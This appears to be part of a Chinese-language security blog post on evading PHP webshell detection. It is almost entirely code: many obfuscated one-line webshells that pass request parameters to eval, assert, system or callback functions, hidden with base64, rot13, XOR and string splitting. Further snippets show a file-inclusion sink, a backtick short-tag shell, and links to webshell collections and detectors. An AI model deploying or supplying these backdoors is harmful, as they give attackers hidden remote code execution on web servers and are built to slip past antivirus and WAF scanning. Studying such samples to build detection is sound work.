+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// &#x5199;&#x5165;&#x7236;&#x7C7B;&#x5C5E;&#x6027;&#xFF0C;&#x4ECE;&#x5B50;&#x7C7B;&#x8BFB;&#x53D6;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>{ <span class="hljs-keyword">static</span> $a; }</span><br><span class="line">	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>{}</span><br><span class="line">	A::$a = $_GET[<span class="hljs-number">0</span>];</span><br><span class="line">	system(B::$a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// session</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">session_start();$_SESSION[<span class="hljs-string">&apos;cmd&apos;</span>] = trim($_POST[<span class="hljs-string">&apos;code&apos;</span>]);</span><br><span class="line"><span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">&apos;\&apos;a\&apos;eis&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>.<span class="hljs-string">&apos;v&apos;</span>.<span class="hljs-string">&apos;a&apos;</span>.<span class="hljs-string">&apos;l&apos;</span>.<span class="hljs-string">&apos;(base64_decode($_SESSION[\&apos;cmd\&apos;]))&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// __destruct&#x6298;&#x6784;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">  <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;$this-&gt;name&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">$user = <span class="hljs-keyword">new</span> User;</span><br><span class="line">$user-&gt;name = <span class="hljs-string">&apos;&apos;</span>.$_POST[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x53D8;&#x91CF;&#x5F15;&#x7528;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="hljs-number">1</span>];</span><br><span class="line">$b = &amp;$a;</span><br><span class="line">$c = &amp;$b;</span><br><span class="line"><span class="hljs-keyword">eval</span>($c);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x53EF;&#x53D8;&#x53D8;&#x91CF;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$do = <span class="hljs-string">&quot;test&quot;</span>;</span><br><span class="line">$$do = $_POST[<span class="hljs-number">1</span>];</span><br><span class="line"><span class="hljs-keyword">eval</span>($$do);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4E00;&#x7EF4;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = substr_replace(<span class="hljs-string">&quot;assexx&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>, <span class="hljs-number">4</span>);</span><br><span class="line">$b = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;&quot;</span> =&gt; $a($_POST[<span class="hljs-number">1</span>]));</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4E8C;&#x7EF4;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = substr_replace(<span class="hljs-string">&quot;assexx&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>, <span class="hljs-number">4</span>);</span><br><span class="line">$b = <span class="hljs-keyword">array</span>($array=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;&quot;</span> =&gt; $a($_POST[<span class="hljs-number">1</span>])));</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x6570;&#x7EC4;&#x4EA4;&#x96C6;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a1 = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;ss&quot;</span> =&gt; <span class="hljs-string">&quot;green&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;blue&quot;</span>, <span class="hljs-string">&quot;er&quot;</span> =&gt; <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;t&quot;</span> =&gt; <span class="hljs-string">&quot;hey&quot;</span>);</span><br><span class="line">$a2 = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;d&quot;</span> =&gt; <span class="hljs-string">&quot;pink&quot;</span>, <span class="hljs-string">&quot;ss&quot;</span> =&gt; <span class="hljs-string">&quot;green&quot;</span>, <span class="hljs-string">&quot;er&quot;</span> =&gt; <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;t&quot;</span> =&gt; <span class="hljs-string">&quot;hey&quot;</span>, <span class="hljs-string">&quot;t&quot;</span> =&gt; <span class="hljs-string">&quot;hey&quot;</span>);</span><br><span class="line">$result = array_intersect_key($a1, $a2);</span><br><span class="line">$a = array_keys($result);</span><br><span class="line">$man = $a[<span class="hljs-number">0</span>].$a[<span class="hljs-number">1</span>].$a[<span class="hljs-number">2</span>].<span class="hljs-string">&quot;t&quot;</span>;</span><br><span class="line">$kk = $_POST[<span class="hljs-number">1</span>];</span><br><span class="line">@$man(`<span class="hljs-comment">/**/</span>`.$kk=$kk);</span><br><span class="line">print_r($a1);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x5404;&#x7C7B;&#x56DE;&#x8C03;&#x51FD;&#x6570;</span></span><br><span class="line">----------------------------------------------------</span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">($a, $b)</span></span>{</span><br><span class="line">	array_map($a, $b);</span><br><span class="line">}</span><br><span class="line">@test(assert, <span class="hljs-keyword">array</span>($_POST[<span class="hljs-number">1</span>]));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>{</span><br><span class="line">     <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;assert&apos;</span>;</span><br><span class="line">}</span><br><span class="line">$a=a();</span><br><span class="line">$aa = <span class="hljs-keyword">array</span>($_GET[<span class="hljs-string">&apos;x&apos;</span>]);</span><br><span class="line">call_user_func_array($a,$a=$aa);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>{</span><br><span class="line">     <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;assert&apos;</span>;</span><br><span class="line">}</span><br><span class="line">$a=a();</span><br><span class="line">$aa=$_GET[<span class="hljs-string">&apos;x&apos;</span>];</span><br><span class="line">call_user_func($a,$a=$aa);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $a = create_function(<span class="hljs-string">&apos;&apos;</span>, @$_REQUEST[<span class="hljs-string">&apos;req&apos;</span>]);$a();<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $ah = $_POST[<span class="hljs-string">&apos;ah&apos;</span>];$arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">&apos;cmd&apos;</span>]);array_filter($arr,base64_decode($ah));<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $fun = $_REQUEST[<span class="hljs-string">&apos;fun&apos;</span>];$arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;xlion&apos;</span>=&gt;<span class="hljs-number">1</span>,$_REQUEST[<span class="hljs-string">&apos;req&apos;</span>]=&gt;<span class="hljs-number">2</span>);uksort($arr,$fun);<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $arr = <span class="hljs-keyword">new</span> ArrayObject(<span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;xlion&apos;</span>, $_REQUEST[<span class="hljs-string">&apos;req&apos;</span>]));$arr-&gt;uasort(base64_decode($_POST[<span class="hljs-string">&apos;fun&apos;</span>]));<span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">	$fun = base64_decode($_REQUEST[<span class="hljs-string">&apos;fun&apos;</span>]);</span><br><span class="line">	$arr = <span class="hljs-keyword">array</span>(base64_decode($_POST[<span class="hljs-string">&apos;code&apos;</span>]));</span><br><span class="line">	$arr2 = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>);</span><br><span class="line">	array_udiff($arr,$arr2,$fun);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> mb_ereg_replace(<span class="hljs-string">&apos;.*&apos;</span>, $_REQUEST[<span class="hljs-string">&apos;req&apos;</span>], <span class="hljs-string">&apos;&apos;</span>, <span class="hljs-string">&apos;e&apos;</span>);<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $fun = $_REQUEST[<span class="hljs-string">&apos;fun&apos;</span>];register_shutdown_function($fun,$_REQUEST[<span class="hljs-string">&apos;req&apos;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> preg_filter(<span class="hljs-string">&apos;|.*|e&apos;</span>,$_REQUEST[<span class="hljs-string">&apos;req&apos;</span>],<span class="hljs-string">&apos;&apos;</span>)<span class="hljs-meta">?&gt;</span></span><br><span class="line">----------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x4EE3;&#x7801;&#x6267;&#x884C;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">- &#x666E;&#x901A;&#x7684;&#x51FD;&#x6570;&#x6267;&#x884C;</span><br><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">proc_open()</span><br><span class="line">&#x53CD;&#x5F15;&#x53F7;</span><br><span class="line"></span><br><span class="line">- LFI: include&#x3001;require...(&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4F2A;&#x534F;&#x8BAE;&#x5C06;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x8F6C;&#x5316;&#x4E3A;&#x4EE3;&#x7801;&#x6267;&#x884C;)</span><br><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&apos;code&apos;]; include ($filename);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">- &#x52A8;&#x6001;&#x51FD;&#x6570;&#x6267;&#x884C;($()...PHP&#x7684;&#x52A8;&#x6001;&#x51FD;&#x6570;&#x7279;&#x6027;)</span><br><span class="line">&lt;?php $_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);?&gt;</span><br><span class="line"></span><br><span class="line">- Curly Syntax(${${...}}...&#x8FD9;&#x79CD;&#x601D;&#x8DEF;&#x53EF;&#x4EE5;&#x628A;&#x53D8;&#x91CF;&#x8D4B;&#x503C;&#x7684;&#x6F0F;&#x6D1E;&#x8F6C;&#x5316;&#x4E3A;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7684;&#x673A;&#x4F1A;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x62FC;&#x63A5;/&#x52A0;&#x5BC6;/&#x7F16;&#x7801;</li>
+</ul>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// &#x6DFB;&#x52A0;&#x6CE8;&#x91CA;&#x7B26;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="hljs-number">1</span>];</span><br><span class="line"><span class="hljs-keyword">eval</span>(`<span class="hljs-comment">/*Hallo*/</span>`.$a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x91CD;&#x590D;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$kk = $_POST[<span class="hljs-number">1</span>];</span><br><span class="line">@<span class="hljs-keyword">eval</span>(`<span class="hljs-comment">/**/</span>`.$kk=$kk);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x901A;&#x8FC7;&#x5B9A;&#x4E49;&#x524D;&#x9762;&#x5B58;&#x5728;&#x7684;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x6DF7;&#x6DC6;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>{</span><br><span class="line">     <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;assert&apos;</span>;</span><br><span class="line">}</span><br><span class="line">$a=a();</span><br><span class="line">$aa = <span class="hljs-keyword">array</span>($_GET[<span class="hljs-string">&apos;x&apos;</span>]);</span><br><span class="line">call_user_func_array($a,$a=$aa);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4F7F;&#x7528;null&#x6216;&quot;&quot;&#x62FC;&#x63A5;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">$name1=$name2= <span class="hljs-keyword">null</span>;</span><br><span class="line"><span class="hljs-keyword">eval</span>($name1.$name2.$name);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">$name1=$name2= <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">eval</span>($name1.$name2.$name);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x7F16;&#x7801;&#x5F62;&#x5F0F;</span></span><br><span class="line"><span class="hljs-comment">// base64</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">$XKs1u=<span class="hljs-string">&apos;as&apos;</span>;$Rqoaou=<span class="hljs-string">&apos;e&apos;</span>;</span><br><span class="line">$ygDOEJ=$XKs1u.<span class="hljs-string">&apos;s&apos;</span>.$Rqoaou.<span class="hljs-string">&apos;r&apos;</span>.<span class="hljs-string">&apos;t&apos;</span>;</span><br><span class="line">$joEDdb =<span class="hljs-string">&apos;b&apos;</span>.$XKs1u.$Rqoaou.(<span class="hljs-number">64</span>).<span class="hljs-string">&apos;_&apos;</span>.<span class="hljs-string">&apos;d&apos;</span>.$Rqoaou.<span class="hljs-string">&apos;c&apos;</span>.<span class="hljs-string">&apos;o&apos;</span>.<span class="hljs-string">&apos;d&apos;</span>.$Rqoaou;</span><br><span class="line">@$ygDOEJ(@$joEDdb($_POST[nihao]));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $a = @base64_decode($a=$_POST[<span class="hljs-string">&apos;fun&apos;</span>]);$a($_POST[<span class="hljs-string">&apos;code&apos;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// rot13</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $a=str_rot13(<span class="hljs-string">&apos;nffreg&apos;</span>);$a($_POST[<span class="hljs-string">&apos;req&apos;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x5F02;&#x6216;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$_=(<span class="hljs-string">&apos;%01&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>).(<span class="hljs-string">&apos;%13&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>).(<span class="hljs-string">&apos;%13&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>).(<span class="hljs-string">&apos;%05&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>).(<span class="hljs-string">&apos;%12&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>).(<span class="hljs-string">&apos;%14&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>); <span class="hljs-comment">// $_=&apos;assert&apos;;</span></span><br><span class="line">$__=<span class="hljs-string">&apos;_&apos;</span>.(<span class="hljs-string">&apos;%0D&apos;</span>^<span class="hljs-string">&apos;]&apos;</span>).(<span class="hljs-string">&apos;%2F&apos;</span>^<span class="hljs-string">&apos;`&apos;</span>).(<span class="hljs-string">&apos;%0E&apos;</span>^<span class="hljs-string">&apos;]&apos;</span>).(<span class="hljs-string">&apos;%09&apos;</span>^<span class="hljs-string">&apos;]&apos;</span>); <span class="hljs-comment">// $__=&apos;_POST&apos;;</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="hljs-comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="&#x7279;&#x6B8A;&#x7684;&#x6280;&#x5DE7;"><a href="#&#x7279;&#x6B8A;&#x7684;&#x6280;&#x5DE7;" class="headerlink" title="&#x7279;&#x6B8A;&#x7684;&#x6280;&#x5DE7;"></a>&#x7279;&#x6B8A;&#x7684;&#x6280;&#x5DE7;</h3><ul>
+<li>&#x7F29;&#x77ED;&#x6280;&#x5DE7;</li>
+</ul>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// &#x4F7F;&#x7528;&#x77ED;&#x6807;&#x7B7E;&#xFF0C;short_open_tag = On </span></span><br><span class="line"><span class="hljs-meta">&lt;?</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?</span>= phpinfo();<span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?</span>=`$_GET[m]`;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x5C3D;&#x91CF;&#x5C06;&#x53D8;&#x91CF;&#x540D;&#x51CF;&#x77ED;</span></span><br><span class="line">$a($b)</span><br><span class="line">$_GET[<span class="hljs-number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><ul>
+<li><a href="https://www.cnblogs.com/littlehann/p/3522990.html" target="_blank" rel="noopener">Deformity PHP Webshell&#x3001;Webshell Hidden Learning</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzIwODIxMjc4MQ==&amp;mid=2651004500&amp;idx=1&amp;sn=ded1cab8068c152ee0c78484650cb8e5&amp;chksm=8cf13816bb86b1005f9e1adbab3e664d018926f9b51b98e9f1a8d30db26885fdbd7a8c61df47&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1588164890809&amp;sharer_shareid=05ca20b275e586f3c46e0d7b0b0555fd&amp;rd2werd=1#wechat_redirect" target="_blank" rel="noopener">WebShell&#x901A;&#x7528;&#x514D;&#x6740;&#x7684;&#x601D;&#x8003;</a></li>
+<li><a href="https://xz.aliyun.com/t/3959" target="_blank" rel="noopener">&#x8FC7;D&#x76FE;webshell&#x5206;&#x4EAB;</a></li>
+<li><a href="https://xz.aliyun.com/t/7151" target="_blank" rel="noopener">Webshell&#x514D;&#x6740;&#x7814;&#x7A76;</a></li>
+<li><a href="https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/" target="_blank" rel="noopener">&#x5168;&#x65B9;&#x4F4D;&#x6784;&#x9020;&#x514D;&#x6740; webshell &#x5C0F;&#x7ED3;[&#x4E00;]</a></li>
+<li><a href="https://github.com/tennc/webshell/tree/master/php" target="_blank" rel="noopener">https://github.com/tennc/webshell/tree/master/php</a></li>
+<li><a href="https://github.com/JohnTroony/php-webshells" target="_blank" rel="noopener">https://github.com/JohnTroony/php-webshells</a></li>
+</ul>
+<p>&#x76F8;&#x5173;&#x68C0;&#x6D4B;&#x5F15;&#x64CE;&#xFF1A;</p>
+<ul>
+<li><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">D&#x76FE;</a></li>
+<li><a href="https://scanner.baidu.com/" target="_blank" rel="noopener">&#x767E;&#x5EA6;WEBDIR+</a></li>
+<li><a href="https://www.shellpub.com/" target="_blank" rel="noopener">&#x6CB3;&#x9A6C;</a></li>
+<li><a href="https://github.com/emposha/PHP-Shell-Detector" target="_blank" rel="noopener">Web Shell Detector</a></li>
+<li><a href="https://webshellchop.chaitin.cn/" target="_blank" rel="noopener">CloudWalker&#xFF08;&#x7267;&#x4E91;&#xFF09;</a> <a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="noopener">github</a></li>
+<li><a href="http://webshell.cdxy.me/" target="_blank" rel="noopener">&#x6DF1;&#x5EA6;&#x5B66;&#x4E60;&#x6A21;&#x578B;&#x68C0;&#x6D4B;PHP Webshell</a></li>
+<li><a href="https://phpchip.com/" target="_blank" rel="noopener">CHIP - Dig all dynamic features in PHP</a></li>
+</ul>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/PHP/">#PHP</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Bypass/">#Bypass</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Webshell/">#Webshell</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/免杀/">#免杀</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2020/04/30/CSP_Bypass/">CSP &amp; Bypass</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
+
+
+    
+    
